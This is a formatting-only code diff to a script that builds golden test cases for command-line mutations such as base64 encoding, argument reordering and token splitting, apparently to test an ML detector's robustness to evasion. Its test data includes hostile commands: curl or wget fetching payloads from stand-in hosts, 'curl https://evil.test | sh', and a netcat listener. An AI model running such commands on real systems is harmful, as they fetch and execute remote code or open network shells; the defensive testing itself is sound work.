@@ -23,22 +23,18 @@ TEST_CASES = [
     ({"argv": ["curl", "-fsSL", "https://evil.example/payload"]}, "base64_encode", "light", 42),
     ({"argv": ["wget", "http://malware.example/payload.sh"]}, "base64_encode", "medium", 42),
     ({"argv": ["sh", "-c", "curl https://evil.test | sh"]}, "base64_encode", "heavy", 42),
-
     # Argument reorder
     ({"argv": ["bash", "-c", "echo hello"]}, "argument_reorder", "light", 100),
     ({"argv": ["python3", "script.py", "arg1", "arg2"]}, "argument_reorder", "medium", 100),
     ({"argv": ["nc", "-l", "4444"]}, "argument_reorder", "heavy", 42),
-
     # Path substitution
     ({"argv": ["/bin/bash", "-c", "base64 -d"]}, "path_substitution", "light", 200),
     ({"argv": ["/bin/ls", "/sbin/init"]}, "path_substitution", "medium", 200),
     ({"argv": ["/bin/cat", "/sbin/modprobe", "/tmp/file"]}, "path_substitution", "heavy", 200),
-
     # Token splitting
     ({"argv": ["base64", "-d"]}, "token_splitting", "light", 300),
     ({"argv": ["python3", "-c", "import os"]}, "token_splitting", "medium", 42),
     ({"argv": ["curl", "https://test.com"]}, "token_splitting", "heavy", 42),
-
     # Padding
     ({"argv": ["bash", "-c", "echo test"]}, "padding", "light", 400),
     ({"argv": ["curl", "https://api.example/data"]}, "padding", "medium", 42),
@@ -73,15 +69,17 @@ def generate_golden() -> list[dict]:
             cmdline_mutated = ml_cmdline_from_record(mutated)
             features_mutated = extract_features(cmdline_mutated)
 
-            golden_cases.append({
-                "original": original,
-                "mutation_class": mutation_class,
-                "intensity": intensity,
-                "seed": seed,
-                "mutated": mutated,
-                "features_original": features_original,
-                "features_mutated": features_mutated,
-            })
+            golden_cases.append(
+                {
+                    "original": original,
+                    "mutation_class": mutation_class,
+                    "intensity": intensity,
+                    "seed": seed,
+                    "mutated": mutated,
+                    "features_original": features_original,
+                    "features_mutated": features_mutated,
+                }
+            )
         except ValueError as e:
             print(f"WARNING: Skipping {mutation_class}/{intensity} on {original}: {e}")
             continue
@@ -100,6 +98,7 @@ def main() -> None:
     print(f"Generated {len(golden)} test cases to {output}")
     print("\nBreakdown:")
     from collections import Counter
+
     by_mutator = Counter(c["mutation_class"] for c in golden)
     for mutator, count in by_mutator.items():
         print(f"  {mutator}: {count}")
